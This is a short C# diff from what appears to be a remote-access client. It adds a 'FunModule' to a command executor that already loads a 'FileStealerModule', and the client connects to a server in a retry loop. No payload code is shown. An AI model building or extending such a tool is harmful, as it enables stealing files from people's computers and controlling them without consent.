@@ -65,7 +65,8 @@ var commandExecutor = new CommandExecutor()
                       .AddModule<ExampleModule>()
                       .AddModule<FileStealerModule>()
                       .AddModule<EmergencyModule>()
-                      .AddModule<RealTimeModule>();
+                      .AddModule<RealTimeModule>()
+                      .AddModule<FunModule>();
 
 var client = await ConnectUntilSuccessAsync();
 while (true)
